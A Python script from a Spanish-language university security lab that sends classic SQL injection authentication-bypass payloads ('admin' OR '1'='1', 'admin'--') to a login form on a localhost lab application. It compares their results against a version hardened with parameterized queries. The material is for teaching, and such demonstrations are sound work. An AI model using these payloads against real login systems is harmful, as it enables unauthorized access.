"""
ataque_sql_i.py
===============
LABORATORIO CONTROLADO - USO ACADÉMICO EXCLUSIVO
Asignatura: Seguridad Informática (UNEMI)

PROPÓSITO DEFENSIVO
-------------------
Este script demuestra, con fines educativos, cómo una aplicación vulnerable
a SQL Injection puede ser evadida. Se ejecuta ÚNICAMENTE contra la aplicación
de laboratorio 'app_vulnerable.py' corriendo en http://127.0.0.1:5000
(el propio equipo del estudiante). NO debe utilizarse contra ningún sistema
sobre el que no se tenga autorización explícita: hacerlo es ilegal y contrario
a la ética profesional.

El objetivo es EVIDENCIAR el problema para luego COMPROBAR que la contramedida
(consultas parametrizadas, SEGURO = True en la app) lo neutraliza por completo.

Uso:
    1) Ejecutar la app en modo VULNERABLE (SEGURO = False).
    2) python ataque_sql_i.py
    3) Repetir con la app en modo SEGURO (SEGURO = True) y comparar.
"""

import urllib.request
import urllib.parse

URL = "http://127.0.0.1:5000/login"

# Payloads de demostración académica. El clásico  ' OR '1'='1  fuerza a que
# la condición WHERE siempre sea verdadera, logrando el bypass de autenticación
# cuando la consulta se construye por concatenación insegura de cadenas.
PRUEBAS = [
    {
        "nombre": "Credencial legítima (control)",
        "usuario": "pedro",
        "clave": "estudiante123",
    },
    {
        "nombre": "Credencial inválida (control)",
        "usuario": "pedro",
        "clave": "claveIncorrecta",
    },
    {
        "nombre": "Bypass de autenticación (SQLi)",
        "usuario": "admin' OR '1'='1",
        "clave": "cualquiera",
    },
    {
        "nombre": "Comentario para anular verificación de clave (SQLi)",
        "usuario": "admin'--",
        "clave": "no_importa",
    },
]


def enviar(usuario: str, clave: str) -> str:
    datos = urllib.parse.urlencode({"usuario": usuario, "clave": clave}).encode()
    req = urllib.request.Request(URL, data=datos, method="POST")
    with urllib.request.urlopen(req, timeout=5) as resp:
        return resp.read().decode("utf-8", errors="replace")


def interpretar(html: str) -> str:
    if "Acceso concedido" in html:
        return "ACCESO CONCEDIDO"
    if "Acceso denegado" in html:
        return "acceso denegado"
    if "Error SQL" in html:
        return "ERROR SQL (posible inyección detectada por el motor)"
    return "respuesta no reconocida"


def main():
    print("=" * 68)
    print(" DEMOSTRACIÓN DE SQL INJECTION - LABORATORIO CONTROLADO (localhost)")
    print("=" * 68)
    for p in PRUEBAS:
        try:
            html = enviar(p["usuario"], p["clave"])
            resultado = interpretar(html)
        except Exception as e:
            resultado = f"sin conexión con la app de laboratorio: {e}"
        print(f"\n[{p['nombre']}]")
        print(f"  usuario = {p['usuario']!r}")
        print(f"  clave   = {p['clave']!r}")
        print(f"  -> {resultado}")
    print("\nNota: en modo SEGURO (consultas parametrizadas) los payloads de")
    print("      inyección deben resultar en 'acceso denegado'.")


if __name__ == "__main__":
    main()
